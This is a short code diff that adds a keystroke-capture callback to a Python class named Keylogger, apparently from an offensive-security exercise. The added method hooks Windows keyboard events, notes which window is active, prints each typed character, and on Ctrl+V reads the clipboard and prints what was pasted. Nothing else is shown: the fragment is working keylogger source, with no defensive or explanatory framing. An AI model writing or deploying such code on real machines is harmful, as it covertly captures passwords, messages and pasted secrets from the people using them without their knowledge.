@@ -54,6 +54,22 @@ class Keylogger:
         windll.kernel32.CloseHandle(hwnd)
         windll.kernel32.CloseHandle(h_process)
 
+    def mykeystroke(self, event):
+        # Captures keystrokes
+        if event.WindowName != self.current_window:
+            # Check if uss has changed windows
+            self.get_current_process()
+        if 32<event.Ascii<127: # If ascii, print out
+            print(chr(event.Ascii), end='')
+        else: # Else grab key name
+            if event.Key == 'V': # If paste (CRTL+V), dump clipboard content
+                win32clipboard.OpenClipboard()
+                value = win32clipboard.GetClipboardData()
+                win32clipboard.CloseClipboard()
+                print(f'[PASTE] - {value}')
+            else:
+                print(f'{event.Key}')
+        return True # Callback returns true to allow next hook
 
-    
+            
     
